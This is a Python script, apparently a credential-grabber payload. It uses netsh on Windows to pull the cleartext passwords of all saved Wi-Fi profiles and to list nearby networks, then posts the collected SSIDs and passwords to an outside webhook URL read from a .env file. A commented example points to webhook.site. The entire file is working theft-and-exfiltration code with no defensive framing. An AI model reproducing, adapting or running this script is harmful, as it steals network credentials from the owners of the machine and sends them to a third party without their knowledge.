import subprocess, os, sys, requests, re, urllib
from dotenv import load_dotenv

load_dotenv()

# Replace with your webhook
url = os.getenv("WEBHOOK_URL")
# url = 'https://webhook.site/###################'

if not url:
    print("WEBHOOK_URL is not set in .env file!")
    sys.exit()

# Lists and regex
found_ssids = []
pwnd = []
nearby_ssids = []
wlan_profile_regex = r"All User Profile\s+:\s(.*)$"
wlan_key_regex = r"Key Content\s+:\s(.*)$"
nearby_ssid_regex = r"SSID\s+\d\s+:\s(.*)$"

# Function to get saved Wi-Fi profiles and passwords
def get_saved_wifi_passwords():
    get_profiles_command = subprocess.run(["netsh", "wlan", "show", "profiles"], stdout=subprocess.PIPE).stdout.decode()

    # Append found SSIDs to list
    matches = re.finditer(wlan_profile_regex, get_profiles_command, re.MULTILINE)
    for match in matches:
        for group in match.groups():
            found_ssids.append(group.strip())

    # Get cleartext password for found SSIDs and place into pwnd list
    for ssid in found_ssids:
        get_keys_command = subprocess.run(["netsh", "wlan", "show", "profile", ("%s" % (ssid)), "key=clear"], stdout=subprocess.PIPE).stdout.decode()
        matches = re.finditer(wlan_key_regex, get_keys_command, re.MULTILINE)
        for match in matches:
            for group in match.groups():
                pwnd.append({
                    "SSID": ssid,
                    "Password": group.strip()
                })

# Function to get nearby active Wi-Fi networks and avoid duplicates
def get_nearby_wifi_networks():
    get_networks_command = subprocess.run(["netsh", "wlan", "show", "networks"], stdout=subprocess.PIPE).stdout.decode()

    # Append nearby SSIDs to list, avoiding duplicates
    matches = re.finditer(nearby_ssid_regex, get_networks_command, re.MULTILINE)
    for match in matches:
        ssid = match.group(1).strip()

        # Filter out empty SSIDs or SSIDs with invalid/partial data
        if ssid and len(ssid) > 1:  # Ignore empty SSID or partial names (length > 1)
            if ssid not in nearby_ssids:  # Avoid duplicates
                nearby_ssids.append(ssid)

# Fetch saved Wi-Fi passwords
get_saved_wifi_passwords()

# Fetch nearby active Wi-Fi networks
get_nearby_wifi_networks()

# Check if any saved Wi-Fi passwords found, if not exit
if len(pwnd) == 0:
    print("No saved Wi-Fi profiles found. Exiting...")
    sys.exit()

# Combine saved SSIDs & passwords with nearby active SSIDs
combined_info = "\nSaved Wi-Fi Profiles (with passwords):\n"
for pwnd_ssid in pwnd:
    combined_info += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"])

combined_info += "\nNearby Active Wi-Fi Networks:\n"
for ssid in nearby_ssids:
    combined_info += "[SSID:%s]\n" % (ssid)

# Send the collected information to the webhook
print("Sending the collected information to the webhook...")
r = requests.post(url, params="format=json", data=combined_info)

# Print confirmation
print("Information sent to webhook.")
